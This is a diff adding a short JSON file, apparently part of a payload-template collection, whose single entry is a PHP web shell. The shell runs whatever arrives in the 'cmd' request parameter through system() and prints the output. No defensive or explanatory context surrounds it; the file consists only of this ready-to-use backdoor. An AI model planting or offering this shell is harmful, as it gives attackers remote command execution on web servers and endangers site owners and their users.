@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "PHP Command Execution via Request",
+      "template": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>",
+      "description": "Simple PHP script to execute commands sent via 'cmd' parameter."
+    }
+  ]
+}
